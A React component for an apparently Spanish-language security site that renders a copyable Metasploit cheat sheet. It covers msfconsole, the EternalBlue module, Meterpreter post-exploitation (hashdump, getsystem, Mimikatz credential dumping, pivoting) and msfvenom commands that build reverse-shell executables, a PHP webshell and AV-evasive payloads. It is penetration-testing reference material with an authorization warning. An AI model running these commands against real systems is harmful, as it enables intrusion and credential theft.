import { useState } from 'react'
import ToolShell from '../components/ToolShell'
import { Copy, Check, Shield, ChevronDown, ChevronUp, AlertTriangle } from 'lucide-react'

const COLOR = '#ef4444'

const COMMANDS = [
  {
    cat: '🚀 msfconsole — Comandos básicos',
    items: [
      { cmd:'msfconsole', desc:'Iniciar la consola interactiva de Metasploit' },
      { cmd:'msfconsole -q', desc:'Iniciar en modo silencioso (sin banner)' },
      { cmd:'search type:exploit name:smb', desc:'Buscar módulos por tipo y nombre' },
      { cmd:'search cve:2021-44228', desc:'Buscar por CVE específico (ej: Log4Shell)' },
      { cmd:'use exploit/multi/handler', desc:'Seleccionar módulo de escucha genérico para recibir reverse shells' },
      { cmd:'info', desc:'Ver info completa del módulo activo: descripción, opciones, autores' },
      { cmd:'options', desc:'Ver opciones del módulo activo y sus valores actuales' },
      { cmd:'show payloads', desc:'Listar payloads compatibles con el exploit seleccionado' },
    ]
  },
  {
    cat: '⚙️ Configuración y lanzamiento',
    items: [
      { cmd:'set RHOSTS 192.168.1.0/24', desc:'Establecer objetivo(s) — soporta rangos CIDR y listas' },
      { cmd:'set RPORT 445', desc:'Puerto del objetivo' },
      { cmd:'set LHOST 192.168.1.100', desc:'IP de nuestra máquina atacante (para reverse shells)' },
      { cmd:'set LPORT 4444', desc:'Puerto de escucha local' },
      { cmd:'set PAYLOAD windows/x64/meterpreter/reverse_tcp', desc:'Seleccionar payload: reverse TCP meterpreter para Windows x64' },
      { cmd:'set PAYLOAD linux/x86/meterpreter/reverse_tcp', desc:'Payload para Linux x86' },
      { cmd:'run', desc:'Ejecutar el módulo (alias de exploit)' },
      { cmd:'exploit -j', desc:'Lanzar en background como job' },
    ]
  },
  {
    cat: '🔍 Reconocimiento integrado',
    items: [
      { cmd:'db_nmap -sV -sC 192.168.1.0/24', desc:'nmap integrado — los resultados se guardan en la base de datos de MSF' },
      { cmd:'hosts', desc:'Ver hosts descubiertos en la base de datos' },
      { cmd:'services', desc:'Ver servicios detectados por nmap/db_nmap' },
      { cmd:'vulns', desc:'Ver vulnerabilidades detectadas automáticamente' },
      { cmd:'use auxiliary/scanner/smb/smb_version', desc:'Detectar versión SMB — prerrequisito para ataques SMB' },
      { cmd:'use auxiliary/scanner/ssh/ssh_version', desc:'Detectar versión SSH' },
      { cmd:'use auxiliary/scanner/portscan/tcp', desc:'Escáner de puertos TCP integrado en MSF' },
    ]
  },
  {
    cat: '💻 Meterpreter — Post-explotación',
    items: [
      { cmd:'sysinfo', desc:'Info del sistema comprometido: OS, hostname, arquitectura' },
      { cmd:'getuid', desc:'Ver con qué usuario estamos ejecutando' },
      { cmd:'getpid', desc:'PID del proceso de Meterpreter actual' },
      { cmd:'shell', desc:'Obtener shell del sistema operativo desde Meterpreter' },
      { cmd:'upload /tools/winpeas.exe C:\\\\Users\\\\Public', desc:'Subir archivo al objetivo' },
      { cmd:'download C:\\\\Users\\\\admin\\\\passwords.txt /tmp/', desc:'Descargar archivo del objetivo' },
      { cmd:'hashdump', desc:'Volcar hashes NTLM del SAM (requiere SYSTEM)' },
      { cmd:'getsystem', desc:'Intentar escalada de privilegios automática a SYSTEM' },
      { cmd:'migrate PID', desc:'Migrar al proceso indicado (para estabilidad o evasión)' },
      { cmd:'background', desc:'Enviar sesión al background (Ctrl+Z también funciona)' },
    ]
  },
  {
    cat: '🦊 Meterpreter — Pivoting y red',
    items: [
      { cmd:'run arp_scanner -r 192.168.1.0/24', desc:'Descubrir hosts en la red interna via ARP desde el objetivo' },
      { cmd:'route add 192.168.2.0/24 SESSION_ID', desc:'Añadir ruta de red via la sesión comprometida (pivoting MSF)' },
      { cmd:'use auxiliary/server/socks_proxy', desc:'Crear proxy SOCKS5 enrutado por la sesión Meterpreter' },
      { cmd:'portfwd add -l 8080 -p 80 -r 192.168.2.10', desc:'Reenviar puerto local 8080 al objetivo en red interna' },
      { cmd:'load kiwi', desc:'Cargar módulo Mimikatz integrado (Kiwi) en Meterpreter' },
      { cmd:'creds_all', desc:'Volcar TODAS las credenciales con Kiwi (Mimikatz)' },
    ]
  },
  {
    cat: '🎯 Módulos útiles — Exploits comunes',
    items: [
      { cmd:'use exploit/windows/smb/ms17_010_eternalblue', desc:'EternalBlue — SMBv1 en Windows 7/2008 (CVE-2017-0144)' },
      { cmd:'use exploit/multi/handler', desc:'Handler genérico para recibir cualquier reverse shell' },
      { cmd:'use exploit/unix/ftp/vsftpd_234_backdoor', desc:'vsftpd 2.3.4 backdoor (puerto 6200)' },
      { cmd:'use exploit/multi/misc/java_rmi_server', desc:'Java RMI server RCE' },
      { cmd:'use post/windows/gather/credentials/credential_collector', desc:'Recolectar credenciales almacenadas en Windows' },
      { cmd:'use post/multi/recon/local_exploit_suggester', desc:'Sugerir exploits de escalada locales según el sistema' },
    ]
  },
  {
    cat: '🔧 msfvenom — Generación de payloads',
    items: [
      { cmd:'msfvenom -l payloads | grep windows', desc:'Listar payloads disponibles para Windows' },
      { cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > shell.exe', desc:'Generar executable (.exe) de reverse shell Windows' },
      { cmd:'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf > shell', desc:'Generar ELF de reverse shell Linux' },
      { cmd:'msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw > shell.php', desc:'Webshell PHP con Meterpreter' },
      { cmd:'msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 R > shell.apk', desc:'APK Android con Meterpreter (tests autorizados)' },
      { cmd:'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > encoded.exe', desc:'Payload codificado con encoder para evasión básica de AV' },
    ]
  },
]

function CopyBtn({ text }) {
  const [copied, setCopied] = useState(false)
  if (!text || text.startsWith('#')) return null
  const copy = () => { navigator.clipboard.writeText(text).then(() => { setCopied(true); setTimeout(()=>setCopied(false),1500) }) }
  return (
    <button onClick={copy} style={{ padding:'4px 8px', borderRadius:6, cursor:'pointer', border:'none', transition:'all .15s', flexShrink:0,
      background: copied ? 'rgba(16,185,129,0.2)' : 'rgba(239,68,68,0.12)', color: copied ? '#10b981' : '#ef4444' }}>
      {copied ? <Check size={12}/> : <Copy size={12}/>}
    </button>
  )
}

export default function ToolMetasploit() {
  const [open, setOpen] = useState({})
  const toggle = (cat) => setOpen(o => ({ ...o, [cat]: !o[cat] }))

  return (
    <ToolShell icon="💀" name="Metasploit" color={COLOR} badge="msfconsole · Meterpreter · msfvenom · EternalBlue · Post-Explotación">
      <div style={{ maxWidth:960, margin:'0 auto', padding:'32px 24px' }}>

        <div style={{ display:'flex', gap:8, padding:'11px 14px', borderRadius:9, marginBottom:18,
          background:'rgba(239,68,68,0.08)', border:'1px solid rgba(239,68,68,0.2)',
          color:'rgba(255,255,255,0.5)', fontSize:11 }}>
          <AlertTriangle size={13} style={{ color:'#ef4444', flexShrink:0, marginTop:1 }}/>
          <span>Metasploit es el framework de explotación más completo del mundo. Uso exclusivo en entornos de laboratorio o con autorización explícita por escrito. Muchos módulos generan IoCs detectables por EDR/AV modernos.</span>
        </div>

        <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit, minmax(160px,1fr))', gap:10, marginBottom:24 }}>
          {[
            { label:'msfconsole', icon:'💻', color:'#ef4444', desc:'Interfaz interactiva principal' },
            { label:'Meterpreter', icon:'👾', color:'#f59e0b', desc:'Post-explotación avanzada' },
            { label:'msfvenom', icon:'🎯', color:'#a78bfa', desc:'Generador de payloads' },
            { label:'db_nmap', icon:'🔍', color:'#3b82f6', desc:'Reconocimiento integrado' },
            { label:'Módulos', icon:'🧩', color:'#10b981', desc:'+2000 exploits, aux, post' },
          ].map(item => (
            <div key={item.label} style={{ background:'rgba(255,255,255,0.03)', border:`1px solid ${item.color}20`, borderRadius:10, padding:'12px', textAlign:'center' }}>
              <div style={{ fontSize:20, marginBottom:4 }}>{item.icon}</div>
              <div style={{ color:item.color, fontSize:12, fontWeight:700, marginBottom:4 }}>{item.label}</div>
              <div style={{ color:'rgba(255,255,255,0.35)', fontSize:10 }}>{item.desc}</div>
            </div>
          ))}
        </div>

        {COMMANDS.map(cat => (
          <div key={cat.cat} style={{ marginBottom:10, background:'rgba(255,255,255,0.02)', border:'1px solid rgba(255,255,255,0.07)', borderRadius:12, overflow:'hidden' }}>
            <button onClick={()=>toggle(cat.cat)} style={{ width:'100%', display:'flex', justifyContent:'space-between', alignItems:'center', padding:'12px 16px', background:'none', border:'none', cursor:'pointer', color:'rgba(255,255,255,0.7)', fontSize:13, fontWeight:600, textAlign:'left' }}>
              {cat.cat}{open[cat.cat] ? <ChevronUp size={14}/> : <ChevronDown size={14}/>}
            </button>
            {open[cat.cat] && (
              <div style={{ padding:'0 12px 12px', display:'flex', flexDirection:'column', gap:8 }}>
                {cat.items.map((item,i) => (
                  <div key={i} style={{ background:'rgba(0,0,0,0.3)', borderRadius:9, padding:'10px 12px' }}>
                    <div style={{ display:'flex', gap:8, alignItems:'flex-start', marginBottom: item.desc ? 6 : 0 }}>
                      <code style={{ flex:1, fontSize:11, color: item.cmd.startsWith('#') ? 'rgba(255,255,255,0.3)' : '#fca5a5', fontFamily:'monospace', lineHeight:1.5 }}>{item.cmd}</code>
                      <CopyBtn text={item.cmd}/>
                    </div>
                    {item.desc && <div style={{ color:'rgba(255,255,255,0.4)', fontSize:11 }}>{item.desc}</div>}
                  </div>
                ))}
              </div>
            )}
          </div>
        ))}

      </div>
    </ToolShell>
  )
}
